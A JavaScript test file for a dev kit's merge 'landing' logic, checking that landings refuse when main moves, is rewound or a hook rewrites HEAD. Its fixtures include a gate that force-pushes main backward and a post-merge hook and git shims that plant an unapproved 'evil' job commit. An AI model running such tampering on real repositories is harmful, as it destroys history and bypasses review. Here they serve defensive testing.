// The job registry's landings (kit-162, the A15 "landing" tests; split from
// test/recurring-registry.test.mjs in final-14 F2, so each file runs well inside its watchdog): what
// the checks judged is what lands, under a main that moves, is rewound, or has a hook; a git call that
// hangs is killed at its timeout; a push killed at the timeout that origin then takes is recognised as
// the kit's own landing, and a look-alike never is; and records in home land by their own merge,
// lease and push. Each test is a fixture repo with a bare origin, run through the kit's commands.
// Run with TMUX unset: no fixture here starts or stops a tmux server.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { multiFixture, write, json, kit, gitShim, review, REAL_GIT } from './lib/kit.mjs';
import { SUP, QID, PROJ, JOBS, NOTES, GIT_TIMEOUT, check, jobsText, putJobs, setup, refused, passes } from './fixtures/recurring-registry/shared.mjs';
const SPLIT = (key) => new RegExp(`changes the jobs \\(recurring\\.json\\) and also ${key}: one answer lands one change, so split this into two PRs`);

// The land path's waits, kept short (final-14 F2): a git the shims hang, or a post-receive that sleeps,
// is killed at LAND_TIMEOUT, which every other git call of the landing still clears by far on a fixture
// repo; POST_SLEEP outlasts it more than twice.
const LAND_TIMEOUT = '3000';
const POST_SLEEP = 8;

test('A15 landing: forge git, main moves between the checks and the landing: refused, and main is left as the mover left it (final-4 F3)', () => {
  const T = setup('a15-moved');
  try {
    // a commit on top of main, on origin as another branch: the chore's gate pushes it to main, after
    // the checks and before the landing
    T.syncMain();
    write(path.join(T.old, NOTES), 'moved\n'); T.g(['add', NOTES]); T.g(['commit', '-qm', 'main moves']);
    const adv = T.g(['rev-parse', 'HEAD']);
    T.g(['push', '-q', 'origin', `${adv}:refs/heads/advance`]);
    T.g(['reset', '-q', '--hard', 'HEAD~1']);
    const wt = T.choreBranch('mover', (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), mover: `git push -q origin ${adv}:refs/heads/main` }; }, w));
    const head = T.g(['rev-parse', 'HEAD'], wt);
    refused(T.merge('mover'), /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'main is as the mover left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', head, 'origin/main']), 'the chore did not land');
  } finally { T.done(); }
});

test('A15 landing: forge github, main moves after the checks: refused before gh pr merge, main left as it is; unmoved, gh pr merge runs (final-4 F3)', () => {
  const T = setup('a15-moved-gh');
  try {
    // home's code lands through GitHub: settings forge "github", and a gh first on PATH that answers
    // the calls merge makes (pr view: one open, clean PR at the head; pr merge: logged only)
    T.onSettings((j) => { j.forge = 'github'; });
    const bin = path.join(T.base, 'bin-gh');
    const log = path.join(T.base, 'gh.log');
    const prFile = path.join(T.base, 'pr.json');
    write(path.join(bin, 'gh'), `#!/bin/sh\necho "$@" >> "${log}"\n[ "$1 $2" = "pr view" ] && exec cat "${prFile}"\n[ "$1 $2" = "pr merge" ] && exit 0\nexit 1\n`);
    fs.chmodSync(path.join(bin, 'gh'), 0o755);
    const env = { PATH: `${bin}${path.delimiter}${process.env.PATH}` };
    const calls = () => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8').split('\n').filter(Boolean) : []);
    const prMerges = () => calls().filter((c) => c.startsWith('pr merge '));
    const ghMerge = (slug, wt) => {
      const sha = T.g(['rev-parse', 'HEAD'], wt);
      write(prFile, JSON.stringify({ number: 7, headRefOid: sha, title: `chore-${slug}: jobs`, body: '## One-way doors\n\nNone.\n', isDraft: false, mergeStateStatus: 'CLEAN', url: 'https://example.test/pr/7', statusCheckRollup: [] }));
      fs.rmSync(log, { force: true });
      return { sha, r: T.merge(slug, [], env) };
    };
    T.syncMain();
    write(path.join(T.old, NOTES), 'moved\n'); T.g(['add', NOTES]); T.g(['commit', '-qm', 'main moves']);
    const adv = T.g(['rev-parse', 'HEAD']);
    T.g(['push', '-q', 'origin', `${adv}:refs/heads/advance`]);
    T.g(['reset', '-q', '--hard', 'HEAD~1']);
    const gate = (name, cmd) => (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), [name]: cmd }; }, w);
    const moved = ghMerge('mover', T.choreBranch('mover', gate('mover', `git push -q origin ${adv}:refs/heads/main`)));
    refused(moved.r, /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    assert.ok(calls().some((c) => c.startsWith('pr view ')), 'the stand-in answered the PR');
    assert.deepEqual(prMerges(), [], 'gh pr merge was never called');
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'main is as the mover left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', moved.sha, 'origin/main']), 'the chore did not land');
    // control: the same kind of chore, a gate that leaves main alone: gh pr merge runs, at the head
    const still = ghMerge('still', T.choreBranch('still', gate('still', 'true')));
    passes(still.r);
    assert.deepEqual(prMerges(), [`pr merge 7 --merge --match-head-commit ${still.sha}`]);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), adv, 'the stand-in lands nothing');
    // the re-fetch before gh pr merge fails (a git that fails every fetch once the chore's gate has
    // run): refused, never read as main unmoved, and gh pr merge never runs (T3-1)
    const marker = path.join(T.base, 'fetches-fail');
    const shim = path.join(T.base, 'git-fetch-fails');
    write(path.join(shim, 'git'), `#!/bin/sh\nif [ -f "${marker}" ]; then case " $* " in *" fetch "*) echo "fatal: the test's fetch fails" >&2; exit 128 ;; esac; fi\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(shim, 'git'), 0o755);
    const nf = T.choreBranch('nofetch', gate('nofetch', `touch "${marker}"`));
    const nsha = T.g(['rev-parse', 'HEAD'], nf);
    write(prFile, JSON.stringify({ number: 7, headRefOid: nsha, title: 'chore-nofetch: jobs', body: '## One-way doors\n\nNone.\n', isDraft: false, mergeStateStatus: 'CLEAN', url: 'https://example.test/pr/7', statusCheckRollup: [] }));
    fs.rmSync(log, { force: true });
    const nr = T.merge('nofetch', [], { PATH: `${shim}${path.delimiter}${bin}${path.delimiter}${process.env.PATH}` });
    refused(nr, /couldn't fetch main to check it hasn't moved since the checks; run merge again/);
    assert.ok(fs.existsSync(marker), 'the gate ran');
    assert.deepEqual(prMerges(), [], 'gh pr merge was never called');
  } finally { T.done(); }
});

// A job that never had an answer, as a hook or a moved HEAD would write it.
const EVIL = '{"evil":{"kind":"check","title":"Evil","what":"x","every":"1h","run":"echo evil"}}';
// The commands that write it at the jobs file of the checkout git runs in, as a commit on HEAD's
// parents (-p … flags in $p), and move HEAD there; $G is the git to run.
const evilCommit = (p) => `printf '%s\\n' '${EVIL}' > ${JOBS}\n"$G" update-index --add ${JOBS}\nt=$("$G" write-tree)\nc=$("$G" commit-tree ${p} -m 'moved HEAD' "$t")\n"$G" update-ref HEAD "$c"\n`;

test('A15 landing: forge git, a hook the branch tracks (home has core.hooksPath .githooks) never runs in the landing merge: the judged merge lands, and no job (final-10 F1)', () => {
  const T = setup('a15-hook');
  try {
    // final-10's H1: home runs its hooks from a tracked dir (husky, a .githooks convention), and a
    // chore adds a post-merge hook there that writes a job and moves HEAD, after git merge
    const ran = path.join(T.base, 'hook-ran');
    T.g(['config', 'core.hooksPath', '.githooks']);
    T.choreBranch('hook', (wt) => {
      const h = path.join(wt, '.githooks/post-merge');
      write(h, `#!/bin/sh\n# runs inside the kit's landing merge, after the judged tree is merged\ntouch "${ran}"\nG=git\n${evilCommit('-p HEAD')}`);
      fs.chmodSync(h, 0o755);
    });
    const sha = T.headOf('chore-hook');
    const checked = T.g(['rev-parse', 'origin/main']);
    assert.equal(T.has('origin/chore-hook', JOBS), false, 'the judged head has no jobs file');
    // the hook file is outside project/: a chore lands it only with an owner's answer
    const gr = T.run(['ask', '--class', 'governance-edit', '--question', 'Should I add a post-merge git hook?', '--recommendation', 'Yes']);
    passes(gr);
    const gq = QID.exec(gr.out)[0];
    T.answer(gq);
    const spy = gitShim(T);
    const r = T.merge('hook', ['--approved', gq], spy.env);
    assert.equal(fs.existsSync(ran), false, 'the branch\'s hook never ran');
    passes(r);
    // what lands is the merge the checks judged: checked main and the head, and no job
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.has('origin/main', JOBS), false, 'no job landed on main');
    assert.equal(T.g(['rev-list', '--parents', '-n', '1', 'origin/main']).split(' ').slice(1).join(' '), `${checked} ${sha}`);
    assert.equal(T.g(['rev-parse', 'origin/main^{tree}']), T.g(['rev-parse', `${sha}^{tree}`]), 'the head\'s tree lands');
    assert.match(spy.calls(), /(^| )-c core\.hooksPath=\/dev\/null -c merge\.directoryRenames=conflict -c commit\.cleanup=verbatim -c merge\.log=false merge --no-ff/m);
    assert.match(spy.calls(), /(^| )push --quiet --no-verify --force-with-lease=main:/m);
  } finally { T.done(); }
});

test('A15 landing: forge git, HEAD moved after the landing merge (as a hook that ran anyway would) is refused before the push: the merge must be the head onto the checked main, its jobs the judged ones (final-10 F1)', () => {
  const T = setup('a15-head');
  try {
    T.onMain(() => ({ aa: check({ title: 'A job' }) }));
    // a git that, after the kit's landing merge, moves HEAD as the mode file says: "jobs", to a
    // commit with the same two parents and a job no answer showed; "extra", to one more commit on
    // the merge, with the jobs left as they are
    const mode = path.join(T.base, 'head-mode');
    const dir = path.join(T.base, 'git-moves-head');
    write(path.join(dir, 'git'), `#!/bin/sh\nG="${REAL_GIT}"\ncase " $* " in\n  *" merge --no-ff --quiet "*)\n    "$G" "$@" || exit $?\n    case "$(cat "${mode}")" in\n      jobs)\n${evilCommit('-p HEAD^1 -p HEAD^2')}      ;;\n      extra)\n        echo x > hook-extra.txt\n        "$G" update-index --add hook-extra.txt\n        t=$("$G" write-tree)\n        c=$("$G" commit-tree -p HEAD -m 'moved HEAD' "$t")\n        "$G" update-ref HEAD "$c"\n      ;;\n    esac\n    exit 0 ;;\nesac\nexec "$G" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    const env = { PATH: `${dir}${path.delimiter}${process.env.PATH}` };
    for (const [how, re] of [
      ['jobs', /the landing merge at [0-9a-f]{12} lands other jobs \(recurring\.json\) than the checks judged; nothing pushed/],
      ['extra', /the landing merge at [0-9a-f]{12} is not the merge of [0-9a-f]{12} onto main at [0-9a-f]{12} the checks judged; nothing pushed/],
    ]) {
      T.choreBranch(how, (w) => write(path.join(w, NOTES), `${how}\n`));
      const before = T.g(['rev-parse', 'origin/main']);
      write(mode, `${how}\n`);
      refused(T.merge(how, [], env), re);
      T.g(['fetch', '-q', 'origin']);
      assert.equal(T.g(['rev-parse', 'origin/main']), before, `${how}: nothing pushed`);
      assert.deepEqual(T.mainJobs(), { aa: check({ title: 'A job' }) }, `${how}: no job landed`);
    }
  } finally { T.done(); }
});

test('A15 landing: forge git, main rewound between the checks and the landing: the lease refuses, and main is left as the rewinder left it (final-10 F2)', () => {
  const T = setup('a15-rewound');
  try {
    // two commits on main, and the chore's gate force-pushes main back to the first, after the checks
    // and before the landing: the landing merge still fast-forwards from there, so only the lease refuses it
    T.onMainFile('README.md', 'one\n');
    T.onMainFile('README.md', 'two\n');
    const back = T.g(['rev-parse', 'origin/main~1']);
    const wt = T.choreBranch('rewinder', (w) => T.edit((j) => { j.gates = { ...(j.gates ?? {}), rewinder: `git push -q -f origin ${back}:refs/heads/main` }; }, w));
    const head = T.g(['rev-parse', 'HEAD'], wt);
    refused(T.merge('rewinder'), /main moved since the checks \([0-9a-f]{12} to [0-9a-f]{12}\); run merge again/);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), back, 'main is as the rewinder left it');
    assert.throws(() => T.g(['merge-base', '--is-ancestor', head, 'origin/main']), 'the chore did not land');
  } finally { T.done(); }
});

test('A15 landing: forge git, a landing push that hangs is killed at its timeout and refused, never waited on (final-10 F4)', { timeout: 300000 }, () => {
  const T = setup('a15-hang');
  try {
    // a git whose push to main never returns (a hung remote): exec, so the kill reaches the sleep
    // itself; the kit's git timeout cut to 3 s (DEVTEAM_GIT_TIMEOUT_MS), so the file stays short (final-14 F2)
    const dir = path.join(T.base, 'git-push-hangs');
    write(path.join(dir, 'git'), `#!/bin/sh\ncase " $* " in *" push --quiet --no-verify --force-with-lease="*) exec sleep 200 ;; esac\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    T.choreBranch('hang', (w) => write(path.join(w, NOTES), 'hang\n'));
    const before = T.g(['rev-parse', 'origin/main']);
    const t0 = Date.now();
    // a push killed at the timeout may still land, so merge says so and asks for a rerun (final-13 F1)
    const r = T.merge('hang', [], { PATH: `${dir}${path.delimiter}${process.env.PATH}`, DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    refused(r, /the code may have landed \(the push to main timed out before origin answered[^\n]*run merge --chore hang again/);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.ok(Date.now() - t0 < 100000, `refused at the timeout, before the hung push returned (${Date.now() - t0} ms)`);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), before, 'nothing landed');
  } finally { T.done(); }
});

test('A15 landing: forge git, a push origin takes but answers after the timeout is landed: merge finds its own checked merge on origin\'s main, logs the act, and the answer counts as landed (final-11 F3)', { timeout: 300000 }, () => {
  const T = setup('a15-slow-receive');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('slow', () => ({ aa: check() }));
    // origin's post-receive outlasts the kit's git timeout (cut to 3 s): the ref is updated, and
    // the push is killed before it answers
    const hook = path.join(T.org, 'hooks', 'post-receive');
    write(hook, `#!/bin/sh\nexec sleep ${POST_SLEEP} >/dev/null 2>&1\n`);
    fs.chmodSync(hook, 0o755);
    const before = T.acts().length;
    const r = T.merge('slow', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    fs.rmSync(hook, { force: true });
    passes(r);
    assert.match(r.text, /the push to main timed out, but origin's main is the landing merge the kit built and checked \([0-9a-f]{12}\): landed/);
    const added = T.acts().slice(before);
    assert.equal(added.length, 1, JSON.stringify(added));
    assert.equal(added[0].class, 'merge-chore');
    assert.equal(added[0].approved_by, q);
    assert.deepEqual(T.mainJobs(), { aa: check() });
    const s = json(T.ok(['recurring', 'show', 'aa', '--json']));
    assert.equal(s.registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

test('A15 landing: forge git, a landing merge that hangs is killed at its timeout and refused, with nothing pushed (final-11 F4)', { timeout: 300000 }, () => {
  const T = setup('a15-merge-hangs');
  try {
    // a git whose landing merge never returns: exec, so the kill reaches the sleep itself
    const dir = path.join(T.base, 'git-merge-hangs');
    write(path.join(dir, 'git'), `#!/bin/sh\ncase " $* " in *" merge --no-ff --quiet "*) exec sleep 200 ;; esac\nexec "${REAL_GIT}" "$@"\n`);
    fs.chmodSync(path.join(dir, 'git'), 0o755);
    T.choreBranch('mhang', (w) => write(path.join(w, NOTES), 'mhang\n'));
    const before = T.g(['rev-parse', 'origin/main']);
    const acts = T.acts().length;
    const t0 = Date.now();
    // it says it timed out, never that the head doesn't merge (final-11 F6)
    const r = T.merge('mhang', [], { PATH: `${dir}${path.delimiter}${process.env.PATH}`, DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT });
    refused(r, /the landing merge of [0-9a-f]{12} onto main timed out; nothing pushed/);
    assert.doesNotMatch(r.text, /does not merge/);
    assert.ok(Date.now() - t0 < 100000, `refused at the timeout, before the hung merge returned (${Date.now() - t0} ms)`);
    T.g(['fetch', '-q', 'origin']);
    assert.equal(T.g(['rev-parse', 'origin/main']), before, 'nothing pushed');
    assert.equal(T.acts().length, acts, 'nothing logged');
  } finally { T.done(); }
});

// Records in home (links.console.records "home"): a console ticket's records land on home's main
// from home's ticket/<id> (landRecords), ahead of its code. Records never change the jobs (final-11 F1).
function recordsHome(name) {
  const F = multiFixture(name);
  const links = json(F.okIn(F.old, ['settings'])).links;
  F.lines({ ...F.STD, console: { link: 'console' }, companion: { link: 'companion' } }, { links: { ...links, console: { ...links.console, records: 'home' } } });
  const { old, g } = F;
  const date = (d) => ({ ...process.env, GIT_COMMITTER_DATE: d, GIT_AUTHOR_DATE: d });
  const gd = (args, cwd, d) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], timeout: GIT_TIMEOUT, env: date(d) }).trim();
  const text = (r) => ({ status: r.status, text: `${r.out}\n${r.err}` });
  // console's ticket/<id>: the code
  const code = (id) => {
    F.ticket(id);
    const w = path.join(old, '.worktrees', id);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, w, 'origin/trunk'], F.console);
    write(path.join(w, 'src/main.js'), `${id}\n`);
    g(['add', '-A'], w); g(['commit', '-qm', `${id}: work`], w); g(['push', '-q', 'origin', `ticket/${id}`], w);
    write(path.join(old, `docs/devteam/run/pr/ticket/${id}.md`), `# ${id}: work\n\n## One-way doors\n\nNone.\n`);
    return g(['rev-parse', 'HEAD'], w);
  };
  // the records on home's ticket/<id> (its worktree rw, already at the history wanted): spec, plan and
  // verification, approved, then a final review naming the code and the records
  const records = (id, rw, codeSha) => {
    const T = path.join(rw, 'docs/devteam/project/tickets', id);
    write(path.join(T, 'spec.md'), '# spec\n'); write(path.join(T, 'plan.md'), '# plan\n\n## TL;DR\n\n- x\n');
    write(path.join(T, 'verification.md'), '| Done-when | Command | Result |\n|---|---|---|\n| s | t | pass |\n');
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: records`], rw);
    const rec = g(['rev-parse', 'HEAD'], rw);
    F.okIn(old, ['act', '--class', 'approve-spec', '--refs', id, '--', 'ok'], SUP);
    F.okIn(old, ['act', '--class', 'approve-plan', '--refs', id, '--', 'ok'], SUP);
    write(path.join(T, 'reviews/final-1.md'), `- Records: ${rec}\n${review('reviewer-b', codeSha)}`);
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: final review`], rw); g(['push', '-q', '-f', 'origin', `ticket/${id}`], rw);
    return g(['rev-parse', 'HEAD'], rw);
  };
  const mainNow = () => { g(['fetch', '-q', 'origin'], old); return g(['rev-parse', 'origin/main'], old); };
  const jobsAt = (ref) => { try { return JSON.parse(g(['show', `${ref}:${JOBS}`], old)); } catch { return {}; } };
  const done = () => { if (!process.env.DEVTEAM_TEST_KEEP) fs.rmSync(F.base, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }); };
  return { ...F, gd, text, code, records, mainNow, jobsAt, done };
}

test('A15 landing: records in home, a criss-cross records branch that would land a stopped job again is refused, and home\'s main is left as it is (final-11 F1)', () => {
  const F = recordsHome('recur-records-cc');
  const { old, g, gd } = F;
  const id = 'console-01-a';
  try {
    const codeSha = F.code(id);
    // home's main: O holds a job, then Y1 stops it (the owner's answered stop; by hand here)
    g(['fetch', '-q', 'origin'], old);
    const m = path.join(old, '.worktrees', 'cc-main');
    g(['worktree', 'add', '-q', '-b', 'cc-main', m, 'origin/main'], old);
    write(path.join(m, JOBS), jobsText({ old: check() }));
    g(['add', '-A'], m); g(['commit', '-qm', 'O: a job'], m);
    const O = g(['rev-parse', 'HEAD'], m);
    write(path.join(m, JOBS), jobsText({}));
    g(['commit', '-qam', 'Y1: the job stopped'], m);
    const Y1 = g(['rev-parse', 'HEAD'], m);
    // X1, off O, touches only the ticket's own folder, with a later committer date (so git's single
    // merge base is X1); main merges it
    const x = path.join(old, '.worktrees', 'cc-side');
    g(['worktree', 'add', '-q', '-b', 'cc-side', x, O], old);
    write(path.join(x, `docs/devteam/project/tickets/${id}/earlier.md`), 'earlier\n');
    g(['add', '-A'], x); gd(['commit', '-qm', 'X1: an earlier landing of the records'], x, '2030-01-05T00:00:00');
    const X1 = g(['rev-parse', 'HEAD'], x);
    g(['merge', '-q', '--no-ff', '--no-edit', X1], m);
    g(['push', '-q', 'origin', 'HEAD:main'], m);
    // the records branch: an evil merge of X1 and Y1 that keeps X1's jobs file, then the records
    const rw = path.join(old, '.worktrees', `records-${id}`);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, X1], old);
    try { g(['merge', '-q', '--no-ff', '--no-commit', Y1], rw); } catch {}
    g(['checkout', X1, '--', JOBS], rw);
    g(['commit', '-qm', 'records (evil merge)'], rw);
    const head = F.records(id, rw, codeSha);
    const before = F.mainNow();
    assert.deepEqual(F.jobsAt(before), {}, 'main has the job stopped');
    assert.equal(g(['merge-base', '--all', before, head], old).split('\n').length, 2, 'a criss-cross: two merge bases');
    // what plain git lands: the stopped job, back
    g(['checkout', '-q', '-b', 'cc-plain', before], m);
    g(['merge', '-q', '--no-ff', '--no-edit', head], m);
    assert.ok(Object.hasOwn(F.jobsAt('cc-plain'), 'old'), 'plain git lands the stopped job again');
    const MULTI = new RegExp(`home's ticket/${id} has 2 merge bases with home's main`);
    refused(F.text(F.runIn(old, ['check-pr', '--head-ref', `ticket/${id}`, '--sha', head])), MULTI);
    refused(F.text(F.runIn(old, ['merge', id], SUP)), MULTI);
    assert.equal(F.mainNow(), before, "home's main is as it was");
    assert.deepEqual(F.jobsAt('origin/main'), {}, 'no job landed');
  } finally { F.done(); }
});

test('A15 landing: records in home behind a main that changed the jobs are refused until main is merged in; then they land, with main\'s jobs (final-11 F1)', () => {
  const F = recordsHome('recur-records-behind');
  const { old, g } = F;
  const id = 'console-01-a';
  try {
    const codeSha = F.code(id);
    g(['fetch', '-q', 'origin'], old);
    const rw = path.join(old, '.worktrees', `records-${id}`);
    g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, 'origin/main'], old);
    // main gains a job after the records branch parts from it
    const m = path.join(old, '.worktrees', 'jobs-main');
    g(['worktree', 'add', '-q', '-b', 'jobs-main', m, 'origin/main'], old);
    write(path.join(m, JOBS), jobsText({ aa: check() }));
    g(['add', '-A'], m); g(['commit', '-qm', 'main: a job'], m); g(['push', '-q', 'origin', 'HEAD:main'], m);
    F.records(id, rw, codeSha);
    const before = F.mainNow();
    refused(F.text(F.runIn(old, ['merge', id, '--dry-run'], SUP)), new RegExp(`home's ticket/${id}: recurring\\.json: this branch doesn't contain main's tip, and it or main changed a recurring\\.json since they parted; merge main into the branch first`));
    assert.equal(F.mainNow(), before);
    // main merged in: the records land, and the jobs are main's
    g(['fetch', '-q', 'origin'], rw);
    g(['merge', '-q', '--no-ff', '--no-edit', 'origin/main'], rw);
    const T = path.join(rw, 'docs/devteam/project/tickets', id, 'reviews/final-2.md');
    write(T, `- Records: ${g(['rev-parse', 'HEAD'], rw)}\n${review('reviewer-c', codeSha)}`);
    g(['add', '-A'], rw); g(['commit', '-qm', `${id}: final review again`], rw); g(['push', '-q', 'origin', `ticket/${id}`], rw);
    const ok = F.runIn(old, ['merge', id], SUP);
    assert.equal(ok.status, 0, `${ok.out}\n${ok.err}`);
    assert.match(ok.out, /landed the records of console-01-a/);
    g(['cat-file', '-e', `origin/main:docs/devteam/project/tickets/${id}/spec.md`], old);
    assert.deepEqual(F.jobsAt('origin/main'), { aa: check() }, "main's jobs, as they were");
  } finally { F.done(); }
});

// ---- landRecords, the records path's own landing (final-12 F1, F3) ----
// a git that acts only in the records landing merge (its message names "Merged home's ticket/")
const recShim = (F, name, body) => {
  const dir = path.join(F.base, `git-${name}`);
  write(path.join(dir, 'git'), `#!/bin/sh\nG="${REAL_GIT}"\ncase " $* " in\n  *" merge --no-ff --quiet -m "*"Merged home's ticket/"*)\n${body}\n  ;;\nesac\nexec "$G" "$@"\n`);
  fs.chmodSync(path.join(dir, 'git'), 0o755);
  return { PATH: `${dir}${path.delimiter}${process.env.PATH}` };
};
// console's code on its ticket branch, and home's ticket/<id> with the records off home's main
const recordsReady = (F, id) => {
  const codeSha = F.code(id);
  F.g(['fetch', '-q', 'origin'], F.old);
  const rw = path.join(F.old, '.worktrees', `records-${id}`);
  F.g(['worktree', 'add', '-q', '-b', `ticket/${id}`, rw, 'origin/main'], F.old);
  return { codeSha, rw, head: F.records(id, rw, codeSha) };
};
// one commit on home's main, pushed straight to origin
let homeN = 0;
const onHomeMain = (F, rel, body, msg) => {
  const m = path.join(F.old, '.worktrees', `hm-${++homeN}`);
  F.g(['fetch', '-q', 'origin'], F.old);
  F.g(['worktree', 'add', '-q', '--detach', m, 'origin/main'], F.old);
  write(path.join(m, rel), body);
  F.g(['add', '-A'], m); F.g(['commit', '-qm', msg], m); F.g(['push', '-q', 'origin', 'HEAD:main'], m);
  return F.g(['rev-parse', 'HEAD'], m);
};
const RID = 'console-01-a';

test('A15 landing: records in home, home\'s main rewound between the checks and the records landing: the lease refuses, and main is left as the rewinder left it (final-12 F1)', () => {
  const F = recordsHome('recur-rec-rewind');
  try {
    onHomeMain(F, `${PROJ}/notes-a.md`, 'a\n', 'one');
    onHomeMain(F, `${PROJ}/notes-b.md`, 'b\n', 'two');
    recordsReady(F, RID);
    F.mainNow();
    const back = F.g(['rev-parse', 'origin/main~1'], F.old);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP, recShim(F, 'rewind', `    "$G" push -q -f origin ${back}:refs/heads/main >/dev/null 2>&1`)));
    refused(r, /push to home's main refused/);
    assert.equal(F.mainNow(), back, 'main as the rewinder left it');
  } finally { F.done(); }
});

test('A15 landing: records in home, HEAD moved after the records merge (a new job on the same parents, or a commit on top) is refused before the push (final-12 F1)', () => {
  for (const how of ['jobs', 'extra']) {
    const F = recordsHome(`recur-rec-head-${how}`);
    try {
      recordsReady(F, RID);
      const before = F.mainNow();
      const after = how === 'jobs'
        ? `    "$G" "$@" || exit $?\n${evilCommit('-p HEAD^1 -p HEAD^2')}    exit 0`
        : '    "$G" "$@" || exit $?\n    echo x > hook-extra.txt\n    "$G" update-index --add hook-extra.txt\n    t=$("$G" write-tree)\n    c=$("$G" commit-tree -p HEAD -m moved "$t")\n    "$G" update-ref HEAD "$c"\n    exit 0';
      const r = F.text(F.runIn(F.old, ['merge', RID], SUP, recShim(F, `head-${how}`, after)));
      refused(r, how === 'jobs' ? /lands other jobs \(recurring\.json\) than home's main has/ : /the records merge at [0-9a-f]{12} is not home's ticket/);
      assert.equal(F.mainNow(), before, `${how}: nothing pushed`);
      assert.deepEqual(F.jobsAt('origin/main'), {}, `${how}: no job landed`);
    } finally { F.done(); }
  }
});

test('A15 landing: records in home, a records merge that hangs is killed at its timeout and refused, with nothing pushed (final-12 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-hang');
  try {
    recordsReady(F, RID);
    const before = F.mainNow();
    const t0 = Date.now();
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP, { ...recShim(F, 'hang', '    exec sleep 200'), DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT }));
    refused(r, /timed out; nothing pushed/);
    assert.ok(Date.now() - t0 < 100000, `killed at its timeout, not waited on (${Date.now() - t0} ms)`);
    assert.equal(F.mainNow(), before);
  } finally { F.done(); }
});

test('A15 landing: records in home, a post-merge hook from home\'s core.hooksPath never runs in the records merge (final-12 F1)', () => {
  const F = recordsHome('recur-rec-hook');
  try {
    recordsReady(F, RID);
    const hooks = path.join(F.base, 'abs-hooks');
    const ran = path.join(F.base, 'hook-ran');
    write(path.join(hooks, 'post-merge'), `#!/bin/sh\ntouch "${ran}"\n`);
    fs.chmodSync(path.join(hooks, 'post-merge'), 0o755);
    F.g(['config', 'core.hooksPath', hooks], F.old);
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r.status, 0, r.text);
    assert.match(r.text, /landed the records of console-01-a/);
    assert.equal(fs.existsSync(ran), false, 'the hook never ran');
  } finally { F.done(); }
});

test('A15 landing: records in home, a records push origin takes but answers after the timeout is landed: merge finds the records merge on home\'s main, logs their act, and lands the code (final-12 F3)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-slow');
  try {
    const { head } = recordsReady(F, RID);
    const hook = path.join(F.org, 'hooks', 'post-receive');
    write(hook, `#!/bin/sh\nexec sleep ${POST_SLEEP} >/dev/null 2>&1\n`);
    fs.chmodSync(hook, 0o755);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try { r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: LAND_TIMEOUT })); } finally { fs.rmSync(hook, { force: true }); }
    assert.equal(r.status, 0, r.text);
    assert.match(r.text, /but origin's main is the records merge the kit built and checked \([0-9a-f]{12}\): landed/);
    assert.match(r.text, /landed the records of console-01-a/);
    F.g(['merge-base', '--is-ancestor', head, F.mainNow()], F.old);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once');
  } finally { F.done(); }
});

// ---- a push killed at the timeout that origin then takes (final-13 F1) ----
// origin's pre-receive outlasts the kit's git timeout (cut to 2 s): the push is killed before
// origin updates the ref, and origin then takes it. The first run says it may have landed; the rerun
// recognises the kit's own landing merge and logs its act once.
const PRE_SLEEP = 4;
const PRE_TIMEOUT = '2000';
const nap = (ms) => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
const slowPreReceive = (origin) => { const hook = path.join(origin, 'hooks', 'pre-receive'); write(hook, `#!/bin/sh\ncat >/dev/null\nexec sleep ${PRE_SLEEP} >/dev/null 2>&1\n`); fs.chmodSync(hook, 0o755); return hook; };
// until the bare origin's branch is no longer at `from` (or 40 s pass); returns where it is
const refMoves = (origin, branch, from) => {
  const at = () => execFileSync('git', ['rev-parse', `refs/heads/${branch}`], { cwd: origin, encoding: 'utf8', timeout: GIT_TIMEOUT }).trim();
  for (let i = 0; i < 80 && at() === from; i++) nap(500);
  return at();
};
